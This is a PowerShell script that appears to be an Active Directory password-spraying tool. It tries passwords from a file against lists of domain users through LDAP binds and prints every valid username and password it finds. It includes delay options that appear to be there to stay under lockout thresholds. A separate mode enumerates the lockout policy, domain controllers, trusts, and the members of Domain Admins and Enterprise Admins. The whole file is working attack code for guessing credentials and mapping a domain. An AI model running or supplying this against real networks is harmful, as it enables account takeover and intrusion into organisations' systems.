<#
Usage:
  .\aduser.ps1 -UserFile users.txt -PasswordFile passwords.txt -DC dc01 -Domain contoso.local -default
  .\aduser.ps1 -UserFile users.txt -PasswordFile passwords.txt -DC dc01 -Domain contoso.local -personal
  .\aduser.ps1 -DC dc01 -Domain contoso.local -DomainInfo

Options:
  -default          Try each password in PasswordFile against every user in UserFile.
  -personal         Try one password per user. The number of users and passwords must match.
  -domainInfo       Print domain inventory and policy information in English.
  -DelayPerRequest  Delay in seconds between individual bind attempts.
  -DelayPerLoop     Delay in minutes between password loops in -default mode.

Notes:
  - Empty lines are ignored in both input files.
  - Passwords are read in order from top to bottom.
#>
[CmdletBinding(DefaultParameterSetName="Check")]
param(
    [Parameter(Mandatory=$false, ParameterSetName="Check")]
    [string]$UserFile,

    [Parameter(Mandatory=$false, ParameterSetName="Check")]
    [string]$PasswordFile,

    [Parameter(Mandatory=$false, ParameterSetName="Check")]
    [Parameter(Mandatory=$false, ParameterSetName="DomainInfo")]
    [string]$DC,

    [Parameter(Mandatory=$false, ParameterSetName="Check")]
    [Parameter(Mandatory=$false, ParameterSetName="DomainInfo")]
    [string]$Domain,

    [Parameter(Mandatory=$true, ParameterSetName="DomainInfo")]
    [switch]$DomainInfo,

    [Parameter(Mandatory=$false, ParameterSetName="Check")]
    [ValidateRange(0, 3600)]
    [double]$DelayPerRequest = 0,

    [Parameter(Mandatory=$false, ParameterSetName="Check")]
    [ValidateRange(0, 1440)]
    [double]$DelayPerLoop = 0,

    [Parameter(Mandatory=$false, ParameterSetName="Check")]
    [Alias("default")]
    [switch]$SharedDefault,

    [Parameter(Mandatory=$false, ParameterSetName="Check")]
    [Alias("personal")]
    [switch]$PerUser
)

Add-Type -AssemblyName System.DirectoryServices.Protocols

function Stop-Script {
    param(
        [Parameter(Mandatory=$true)]
        [string]$Message
    )

    Write-Host $Message -ForegroundColor Red
    exit 1
}

function Invoke-CmdText {
    param(
        [Parameter(Mandatory=$true)]
        [string]$Command
    )

    $output = & cmd.exe /c $Command 2>&1

    return @($output | ForEach-Object { $_.ToString() })
}

function Get-FirstMatch {
    param(
        [Parameter(Mandatory=$true)]
        [string[]]$Lines,

        [Parameter(Mandatory=$true)]
        [string[]]$Patterns
    )

    foreach ($line in $Lines) {
        foreach ($pattern in $Patterns) {
            if ($line -match $pattern) {
                return $Matches[1].Trim()
            }
        }
    }

    return $null
}

function Get-NetGroupMembers {
    param(
        [Parameter(Mandatory=$true)]
        [string[]]$Lines
    )

    $items = New-Object System.Collections.Generic.List[string]
    $capture = $false

    foreach ($line in $Lines) {
        $trimmed = $line.Trim()

        if (-not $capture) {
            if ($trimmed -match '^Members$') {
                $capture = $true
            }
            continue
        }

        if ([string]::IsNullOrWhiteSpace($trimmed) -or $trimmed -match '^-+$') {
            continue
        }

        if ($trimmed -match '^(The command completed successfully\.|More help is available by typing NET HELPMSG.+)$') {
            break
        }

        if ($trimmed -match '^(Group name|Alias name|Comment|Members|Group scope|User comment)\b') {
            continue
        }

        $items.Add($trimmed)
    }

    return @($items)
}

function Get-DomainInfo {
    $netbiosName = if ($env:USERDOMAIN) { $env:USERDOMAIN } else { "N/A" }
    $dnsName = if ($env:USERDNSDOMAIN) { $env:USERDNSDOMAIN } else { "N/A" }
    $targetDomain = if ($env:USERDNSDOMAIN) { $env:USERDNSDOMAIN } elseif ($env:USERDOMAIN) { $env:USERDOMAIN } else { $null }

    $policyLines = Invoke-CmdText "net accounts /domain"
    $minLength = Get-FirstMatch -Lines $policyLines -Patterns @(
        '^(?:Minimum password length)\s*:\s*(\d+)\s*$'
    )
    $lockoutThreshold = Get-FirstMatch -Lines $policyLines -Patterns @(
        '^(?:Lockout threshold)\s*:\s*(\d+)\s*$'
    )
    $lockoutDuration = Get-FirstMatch -Lines $policyLines -Patterns @(
        '^(?:Lockout duration(?: \(minutes\))?)\s*:\s*([0-9]+|Never)\s*$'
    )

    if ($null -eq $minLength) { $minLength = "N/A" }
    if ($null -eq $lockoutThreshold) { $lockoutThreshold = "N/A" }
    if ($null -eq $lockoutDuration) { $lockoutDuration = "N/A" }
    elseif ($lockoutDuration -match '^\d+$') { $lockoutDuration = "$lockoutDuration minutes" }

    $dcName = "N/A"
    $dcAddress = "N/A"
    $dcList = @()
    $trustList = @()
    $domainAdmins = @()
    $enterpriseAdmins = @()

    if ($targetDomain) {
        $dcGetLines = Invoke-CmdText ("nltest /dsgetdc:{0}" -f $targetDomain)
        $dcName = Get-FirstMatch -Lines $dcGetLines -Patterns @(
            '^\s*DC:\s*\\\\([^\s]+)\s*$'
        )
        $dcAddress = Get-FirstMatch -Lines $dcGetLines -Patterns @(
            '^\s*Address:\s*\\\\([^\s]+)\s*$'
        )

        $dcListLines = Invoke-CmdText ("nltest /dclist:{0}" -f $targetDomain)
        $dcList = @(
            $dcListLines |
                ForEach-Object { $_.Trim() } |
                Where-Object {
                    $_ -match '^\\\\' -and
                    $_ -notmatch '^\\\\(?:Domain Controller|The command completed successfully\.|DSGetDCName|Flags:|Site Name:|The list of DCs|List of DCs)'
                }
        )
    }

    $trustLines = Invoke-CmdText "nltest /domain_trusts"
    $trustList = @(
        $trustLines |
            ForEach-Object { $_.Trim() } |
            Where-Object { $_ -match '^[0-9]+:' -or $_ -match '^\s*\\' }
    )

    $domainAdmins = Get-NetGroupMembers -Lines (Invoke-CmdText 'net group "Domain Admins" /domain')
    $enterpriseAdmins = Get-NetGroupMembers -Lines (Invoke-CmdText 'net group "Enterprise Admins" /domain')

    Write-Host "Domain Inventory"
    Write-Host ("- NetBIOS Name          : {0}" -f $netbiosName)
    Write-Host ("- DNS Name              : {0}" -f $dnsName)
    Write-Host ("- Password Min Length   : {0}" -f $minLength)
    Write-Host ("- Lockout Threshold     : {0}" -f $lockoutThreshold)
    Write-Host ("- Lockout Duration      : {0}" -f $lockoutDuration)
    Write-Host ("- DC Name               : {0}" -f $(if ($dcName) { $dcName } else { "N/A" }))
    Write-Host ("- DC Address            : {0}" -f $(if ($dcAddress) { $dcAddress } else { "N/A" }))

    Write-Host "- DC List"
    if ($dcList.Count -gt 0) {
        foreach ($dc in $dcList) {
            Write-Host ("  - {0}" -f $dc)
        }
    }
    else {
        Write-Host "  - N/A"
    }

    Write-Host "- Domain Trusts"
    if ($trustList.Count -gt 0) {
        foreach ($trust in $trustList) {
            Write-Host ("  - {0}" -f $trust)
        }
    }
    else {
        Write-Host "  - N/A"
    }

    Write-Host "- Domain Admins"
    if ($domainAdmins.Count -gt 0) {
        foreach ($member in $domainAdmins) {
            Write-Host ("  - {0}" -f $member)
        }
    }
    else {
        Write-Host "  - N/A"
    }

    Write-Host "- Enterprise Admins"
    if ($enterpriseAdmins.Count -gt 0) {
        foreach ($member in $enterpriseAdmins) {
            Write-Host ("  - {0}" -f $member)
        }
    }
    else {
        Write-Host "  - N/A"
    }
}

if ($PSCmdlet.ParameterSetName -eq "DomainInfo") {
    Get-DomainInfo
    exit 0
}

if (-not $UserFile -or -not $PasswordFile) {
    Stop-Script "UserFile and PasswordFile are required unless -domainInfo is used."
}

$users = @(Get-Content $UserFile | ForEach-Object { $_.Trim() } | Where-Object { -not [string]::IsNullOrWhiteSpace($_) })
# Passwords must be read verbatim except for trailing CR from Windows line endings.
$passwords = @(Get-Content $PasswordFile | ForEach-Object { $_.TrimEnd("`r") } | Where-Object { -not [string]::IsNullOrWhiteSpace($_) })

if ($SharedDefault -and $PerUser) {
    Stop-Script "-SharedDefault and -personal cannot be used together."
}

if (($DelayPerRequest * 10) % 1 -ne 0) {
    Stop-Script "DelayPerRequest must be specified in 0.1 second increments."
}

$delayPerLoopSeconds = [int]($DelayPerLoop * 60)

$mode = if ($SharedDefault) { "SharedDefault" } else { "Personal" }

if ($mode -eq "SharedDefault") {
    if ($passwords.Count -lt 1) {
        Stop-Script "Shared default mode requires at least one password in PasswordFile."
    }
}
elseif ($users.Count -ne $passwords.Count) {
    Stop-Script "Personal mode requires the same number of users ($($users.Count)) and passwords ($($passwords.Count)). Use -default to apply one or more shared passwords to all users."
}

$foundCount = 0

if ($mode -eq "SharedDefault") {
    for ($p = 0; $p -lt $passwords.Count; $p++) {
        $password = $passwords[$p]

        for ($i = 0; $i -lt $users.Count; $i++) {
            $user = $users[$i]

            $fullUser = "$Domain\$user"

            $conn = New-Object System.DirectoryServices.Protocols.LdapConnection($DC)
            $conn.AuthType = [System.DirectoryServices.Protocols.AuthType]::Negotiate

            try {
                $netCred = New-Object System.Net.NetworkCredential(
                    $user,
                    $password,
                    $Domain
                )

                # Attempt exactly one bind per user/password pair.
                $conn.Bind($netCred)

                $foundCount++
                Write-Host ("[+] {0} : {1}" -f $fullUser, $password)
            }
            catch {
                continue
            }
            finally {
                $conn.Dispose()
            }

            if ($DelayPerRequest -gt 0) {
                $isLastPassword = ($p -eq ($passwords.Count - 1))
                $isLastUser = ($i -eq ($users.Count - 1))

                if (-not ($isLastPassword -and $isLastUser)) {
                    Start-Sleep -Milliseconds ([int]($DelayPerRequest * 1000))
                }
            }
        }

        if ($delayPerLoopSeconds -gt 0 -and $p -lt ($passwords.Count - 1)) {
            Start-Sleep -Seconds $delayPerLoopSeconds
        }
    }
}
else {
    for ($i = 0; $i -lt $users.Count; $i++) {
        $user = $users[$i]
        $password = $passwords[$i]

        $fullUser = "$Domain\$user"

        $conn = New-Object System.DirectoryServices.Protocols.LdapConnection($DC)
        $conn.AuthType = [System.DirectoryServices.Protocols.AuthType]::Negotiate

        try {
            $netCred = New-Object System.Net.NetworkCredential(
                $user,
                $password,
                $Domain
            )

            # Attempt exactly one bind per user/password pair.
            $conn.Bind($netCred)

            $foundCount++
            Write-Host ("[+] {0} : {1}" -f $fullUser, $password)
        }
        catch {
            continue
        }
        finally {
            $conn.Dispose()
        }

        if ($DelayPerRequest -gt 0 -and $i -lt ($users.Count - 1)) {
            Start-Sleep -Milliseconds ([int]($DelayPerRequest * 1000))
        }
    }
}

if ($foundCount -gt 0) {
    Write-Host ""
    Write-Host ("Total matches: {0}" -f $foundCount)
}
else {
    Write-Host "No accounts were found using the default password."
}
